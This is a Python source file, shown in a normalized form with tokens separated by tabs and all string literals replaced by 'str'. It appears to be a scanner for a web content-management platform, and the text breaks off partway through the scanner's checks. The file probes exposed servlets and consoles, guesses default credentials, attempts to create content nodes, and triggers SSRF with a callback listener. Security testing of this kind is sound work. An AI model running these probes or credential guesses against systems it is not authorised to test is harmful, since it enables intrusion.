import	concurrent	.	futures	
import	itertools	
import	json	
import	datetime	
import	traceback	
import	sys	
import	argparse	
import	base64	
import	time	
from	collections	import	namedtuple	
from	http	.	server	import	BaseHTTPRequestHandler	,	HTTPServer	
from	random	import	choice	,	randint	
from	string	import	ascii_letters	
from	threading	import	Thread	

import	requests	

requests	.	packages	.	urllib3	.	disable_warnings	(	)	


CREDS	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	


def	random_string	(	length	=	10	)	:	
return	"str"	.	join	(	[	choice	(	ascii_letters	)	for	_	in	range	(	length	)	]	)	


registered	=	[	]	
token	=	random_string	(	)	
d	=	{	}	
extra_headers	=	{	}	


class	Detector	(	BaseHTTPRequestHandler	)	:	
def	__init__	(	self	,	token	,	d	,	*	args	)	:	
self	.	d	=	d	
self	.	token	=	token	
BaseHTTPRequestHandler	.	__init__	(	self	,	*	args	)	

def	log_message	(	self	,	format	,	*	args	)	:	
return	

def	do_GET	(	self	)	:	
self	.	serve	(	)	

def	do_POST	(	self	)	:	
self	.	serve	(	)	

def	do_PUT	(	self	)	:	
self	.	serve	(	)	

def	serve	(	self	)	:	
try	:	
token	,	key	,	value	=	self	.	path	.	split	(	"str"	)	[	1	:	4	]	
except	:	
self	.	send_response	(	200	)	
return	

if	self	.	token	!=	token	:	
self	.	send_response	(	200	)	
return	

if	key	in	self	.	d	:	
self	.	d	[	key	]	.	append	(	value	)	
else	:	
self	.	d	[	key	]	=	[	value	,	]	

self	.	send_response	(	200	)	


def	register	(	f	)	:	
registered	.	append	(	f	)	

return	f	


Finding	=	namedtuple	(	"str"	,	"str"	)	


def	normalize_url	(	base_url	,	path	)	:	
if	base_url	[	-	1	]	==	"str"	and	(	path	[	0	]	==	"str"	or	path	[	0	]	==	"str"	)	:	
url	=	base_url	[	:	-	1	]	+	path	
else	:	
url	=	base_url	+	path	

return	url	


def	content_type	(	ct	)	:	
return	ct	.	split	(	"str"	)	[	0	]	.	lower	(	)	.	strip	(	)	


def	error	(	message	,	*	*	kwargs	)	:	
print	(	"str"	.	format	(	datetime	.	datetime	.	now	(	)	.	time	(	)	,	message	)	,	sys	.	stderr	)	
for	n	,	a	in	kwargs	.	items	(	)	:	
print	(	"str"	.	format	(	n	,	a	)	,	sys	.	stderr	)	

exc_type	,	exc_value	,	exc_traceback	=	sys	.	exc_info	(	)	
print	(	"str"	+	str	(	exc_type	)	,	sys	.	stderr	)	
print	(	"str"	+	str	(	exc_value	)	,	sys	.	stderr	)	
print	(	"str"	,	sys	.	stderr	)	
traceback	.	print_tb	(	exc_traceback	,	file	=	sys	.	stderr	)	
print	(	"str"	,	sys	.	stderr	)	


def	http_request	(	url	,	method	=	"str"	,	data	=	None	,	additional_headers	=	None	,	proxy	=	None	,	debug	=	False	)	:	
headers	=	{	"str"	:	"str"	}	
if	additional_headers	:	
headers	.	update	(	additional_headers	)	
if	extra_headers	:	

headers	.	update	(	{	


h_name	:	h_value	
for	h_name	,	h_value	in	extra_headers	.	items	(	)	
if	h_name	not	in	headers	
}	)	

if	not	proxy	:	
proxy	=	{	}	

if	debug	:	
print	(	"str"	.	format	(	method	,	url	)	)	

resp	=	requests	.	request	(	method	,	url	,	data	=	data	,	headers	=	headers	,	proxies	=	proxy	,	verify	=	False	,	timeout	=	40	,	allow_redirects	=	False	)	

if	debug	:	
print	(	"str"	,	resp	.	status_code	)	

return	resp	


def	http_request_multipart	(	url	,	method	=	"str"	,	data	=	None	,	additional_headers	=	None	,	proxy	=	None	,	debug	=	False	)	:	
headers	=	{	"str"	:	"str"	}	
if	additional_headers	:	
headers	.	update	(	additional_headers	)	
if	extra_headers	:	
headers	.	update	(	{	


h_name	:	h_value	
for	h_name	,	h_value	in	extra_headers	.	items	(	)	
if	h_name	not	in	headers	
}	)	

if	not	proxy	:	
proxy	=	{	}	

if	debug	:	
print	(	"str"	.	format	(	method	,	url	)	)	

resp	=	requests	.	request	(	method	,	url	,	files	=	data	,	headers	=	headers	,	proxies	=	proxy	,	verify	=	False	,	timeout	=	40	,	allow_redirects	=	False	)	

if	debug	:	
print	(	"str"	,	resp	.	status_code	)	

return	resp	


def	preflight	(	url	,	proxy	=	None	,	debug	=	False	)	:	
try	:	
http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
return	False	
else	:	
return	True	


@register	
def	exposed_get_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
GETSERVLET	=	itertools	.	product	(	(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	)	
GETSERVLET	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	GETSERVLET	)	

results	=	[	]	

for	path	in	GETSERVLET	:	
url	=	normalize_url	(	base_url	,	path	)	

try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	:	
try	:	
json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	
except	:	
pass	
else	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	
"str"	)	

results	.	append	(	f	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_querybuilder_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
QUERYBUILDER	=	itertools	.	product	(	(	"str"	,	"str"	,	
"str"	,	"str"	,	
"str"	,	"str"	,	
"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	)	
QUERYBUILDER	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	QUERYBUILDER	)	

results	=	[	]	
found_json	=	False	
found_feed	=	False	
for	path	in	QUERYBUILDER	:	
if	found_feed	and	found_json	:	
break	

url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	:	
try	:	
json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	
except	:	
pass	
else	:	
if	found_json	:	
continue	

f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
found_json	=	True	

if	"str"	in	str	(	resp	.	content	)	:	
if	found_feed	:	
continue	

f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
found_feed	=	True	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_gql_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
GQLSERVLET	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	

results	=	[	]	
for	path	in	GQLSERVLET	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	:	
try	:	
json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	
except	:	
pass	
else	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_post_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
POSTSERVLET	=	itertools	.	product	(	(	"str"	,	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	)	
POSTSERVLET	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	POSTSERVLET	)	

results	=	[	]	
for	path	in	POSTSERVLET	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
data	=	"str"	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	}	
resp	=	http_request	(	url	,	"str"	,	data	=	data	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	)	
results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	create_new_nodes	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
CREDS	=	(	"str"	,	"str"	)	

POSTSERVLET	=	itertools	.	product	(	(	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	
"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	)	
POSTSERVLET	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	POSTSERVLET	)	

results	=	[	]	
for	path	in	POSTSERVLET	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	,	"str"	:	"str"	}	
resp	=	http_request	(	url	,	"str"	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	
results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	


for	path	,	creds	in	itertools	.	product	(	POSTSERVLET	,	CREDS	)	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	,	
"str"	:	"str"	.	format	(	base64	.	b64encode	(	creds	.	encode	(	)	)	.	decode	(	)	)	}	
resp	=	http_request	(	url	,	"str"	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	.	format	(	creds	)	)	
results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_loginstatus_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
LOGINSTATUS	=	itertools	.	product	(	(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	)	)	
LOGINSTATUS	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	LOGINSTATUS	)	

results	=	[	]	
for	path	in	LOGINSTATUS	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	
results	.	append	(	f	)	

for	creds	in	CREDS	:	
headers	=	{	"str"	:	"str"	.	format	(	base64	.	b64encode	(	creds	.	encode	(	)	)	.	decode	(	)	)	}	
resp	=	http_request	(	url	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	.	format	(	creds	)	)	
results	.	append	(	f	)	

break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_currentuser_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
CURRENTUSER	=	itertools	.	product	(	(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	)	)	
CURRENTUSER	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	CURRENTUSER	)	

results	=	[	]	
for	path	in	CURRENTUSER	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	
results	.	append	(	f	)	

for	creds	in	CREDS	:	
headers	=	{	"str"	:	"str"	.	format	(	base64	.	b64encode	(	creds	.	encode	(	)	)	.	decode	(	)	)	}	
resp	=	http_request	(	url	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	"str"	not	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	.	format	(	creds	)	)	
results	.	append	(	f	)	

break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_userinfo_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
USERINFO	=	itertools	.	product	(	(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	)	)	

USERINFO	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	USERINFO	)	

results	=	[	]	
for	path	in	USERINFO	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	
results	.	append	(	f	)	

for	creds	in	CREDS	:	
headers	=	{	"str"	:	"str"	.	format	(	base64	.	b64encode	(	creds	.	encode	(	)	)	.	decode	(	)	)	}	
resp	=	http_request	(	url	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	"str"	not	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	.	format	(	creds	)	)	
results	.	append	(	f	)	

break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_felix_console	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
FELIXCONSOLE	=	itertools	.	product	(	(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	)	)	
FELIXCONSOLE	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	FELIXCONSOLE	)	

results	=	[	]	
for	path	in	FELIXCONSOLE	:	
url	=	normalize_url	(	base_url	,	path	)	
headers	=	{	"str"	:	"str"	}	
try	:	
resp	=	http_request	(	url	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	
results	.	append	(	f	)	

break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_wcmdebug_filter	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
WCMDEBUG	=	itertools	.	product	(	(	"str"	,	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	,	
(	"str"	,	)	)	
WCMDEBUG	=	list	(	"str"	.	format	(	p1	,	p2	,	p3	)	for	p1	,	p2	,	p3	in	WCMDEBUG	)	

results	=	[	]	
for	path	in	WCMDEBUG	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_wcmsuggestions_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
WCMSUGGESTIONS	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	,	
(	"str"	,	)	
)	
WCMSUGGESTIONS	=	list	(	"str"	.	format	(	p1	,	p2	,	p3	)	for	p1	,	p2	,	p3	in	WCMSUGGESTIONS	)	

results	=	[	]	
for	path	in	WCMSUGGESTIONS	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_auditlog_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
AUDITLOG	=	itertools	.	product	(	(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	)	
AUDITLOG	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	AUDITLOG	)	

results	=	[	]	
for	path	in	AUDITLOG	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	:	
try	:	
count	=	int	(	json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	)	
except	:	
pass	
else	:	
if	count	!=	0	:	
f	=	Finding	(	"str"	,	url	,	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_crxde_logs	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
CRXDELOGS	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	
)	
CRXDELOGS	=	list	(	p1	.	format	(	p2	)	for	p1	,	p2	in	CRXDELOGS	)	

results	=	[	]	
for	path	in	CRXDELOGS	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	(	"str"	in	str	(	resp	.	content	)	or	"str"	in	str	(	resp	.	content	)	)	:	

f	=	Finding	(	"str"	,	url	,	"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_crxde_crx	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
CRXDELITE	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	
)	
CRXDELITE	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	CRXDELITE	)	

CRX	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	
)	
CRX	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	CRX	)	

CRXSEARCH	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	
)	
CRXSEARCH	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	CRXSEARCH	)	

CRXNAMESPACE	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	
)	
CRXNAMESPACE	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	CRXNAMESPACE	)	


PACKMGR	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	
)	
PACKMGR	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	PACKMGR	)	

results	=	[	]	
for	path	in	itertools	.	chain	(	CRXDELITE	,	CRX	,	CRXSEARCH	,	CRXNAMESPACE	,	PACKMGR	)	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	(	"str"	in	str	(	resp	.	content	)	or	"str"	in	str	(	resp	.	content	)	or	
"str"	in	str	(	resp	.	content	)	or	"str"	in	str	(	resp	.	content	)	or	
"str"	in	str	(	resp	.	content	)	)	:	
f	=	Finding	(	"str"	,	url	,	"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_reports	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
DISKUSAGE	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	)	
)	
DISKUSAGE	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	DISKUSAGE	)	

results	=	[	]	
for	path	in	DISKUSAGE	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	(	"str"	in	str	(	resp	.	content	)	)	:	

f	=	Finding	(	"str"	,	url	,	"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	ssrf_salesforcesecret_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
global	token	,	d	

results	=	[	]	

SALESFORCESERVLET1	=	itertools	.	product	(	
(	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	
)	
)	
SALESFORCESERVLET1	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	)	for	pair	in	SALESFORCESERVLET1	)	

SALESFORCESERVLET2	=	itertools	.	product	(	
(	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	random_string	(	)	
SALESFORCESERVLET2	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	.	format	(	cache_buster	)	)	for	pair	in	SALESFORCESERVLET2	)	

SALESFORCESERVLET3	=	itertools	.	product	(	
(	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	randint	(	1	,	2	*	*	12	)	
SALESFORCESERVLET3	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	.	format	(	cache_buster	)	)	for	pair	in	SALESFORCESERVLET3	)	

for	path	in	itertools	.	chain	(	SALESFORCESERVLET1	,	SALESFORCESERVLET2	,	SALESFORCESERVLET3	)	:	
url	=	normalize_url	(	base_url	,	path	)	
encoded_orig_url	=	(	base64	.	b16encode	(	url	.	encode	(	)	)	)	.	decode	(	)	
back_url	=	"str"	.	format	(	my_host	,	token	,	encoded_orig_url	)	
url	=	url	.	format	(	back_url	)	

try	:	
http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

time	.	sleep	(	10	)	

if	"str"	in	d	:	
u	=	base64	.	b16decode	(	d	.	get	(	"str"	)	[	0	]	)	.	decode	(	)	
f	=	Finding	(	"str"	,	u	,	
"str"	
"str"	)	

results	.	append	(	f	)	

return	results	


@register	
def	ssrf_reportingservices_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
global	token	,	d	

results	=	[	]	

REPOSTINGSERVICESSERVLET1	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	

REPOSTINGSERVICESSERVLET2	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	
cache_buster	=	random_string	(	)	
REPOSTINGSERVICESSERVLET2	=	(	path	.	format	(	cache_buster	)	for	path	in	REPOSTINGSERVICESSERVLET2	)	

REPOSTINGSERVICESSERVLET3	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	
cache_buster	=	randint	(	0	,	2	*	*	12	)	
REPOSTINGSERVICESSERVLET3	=	(	path	.	format	(	cache_buster	)	for	path	in	REPOSTINGSERVICESSERVLET3	)	

for	path	in	itertools	.	chain	(	REPOSTINGSERVICESSERVLET1	,	REPOSTINGSERVICESSERVLET2	,	REPOSTINGSERVICESSERVLET3	)	:	
url	=	normalize_url	(	base_url	,	path	)	
encoded_orig_url	=	(	base64	.	b16encode	(	url	.	encode	(	)	)	)	.	decode	(	)	
back_url	=	"str"	.	format	(	my_host	,	token	,	encoded_orig_url	)	
url	=	url	.	format	(	back_url	)	

try	:	
http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

time	.	sleep	(	10	)	

if	"str"	in	d	:	
u	=	base64	.	b16decode	(	d	.	get	(	"str"	)	[	0	]	)	.	decode	(	)	
f	=	Finding	(	"str"	,	u	,	
"str"	
"str"	)	

results	.	append	(	f	)	

return	results	


@register	
def	ssrf_sitecatalyst_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
global	token	,	d	

results	=	[	]	

SITECATALYST1	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	

SITECATALYST2	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	
cache_buster	=	random_string	(	)	
SITECATALYST2	=	(	path	.	format	(	cache_buster	)	for	path	in	SITECATALYST2	)	

SITECATALYST3	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	
cache_buster	=	randint	(	1	,	2	*	*	12	)	
SITECATALYST3	=	(	path	.	format	(	cache_buster	)	for	path	in	SITECATALYST3	)	


for	path	in	itertools	.	chain	(	SITECATALYST1	,	SITECATALYST2	,	SITECATALYST3	)	:	
url	=	normalize_url	(	base_url	,	path	)	
encoded_orig_url	=	(	base64	.	b16encode	(	url	.	encode	(	)	)	)	.	decode	(	)	
back_url	=	"str"	.	format	(	my_host	,	token	,	encoded_orig_url	)	
url	=	url	.	format	(	back_url	)	

try	:	
http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

time	.	sleep	(	10	)	

if	"str"	in	d	:	
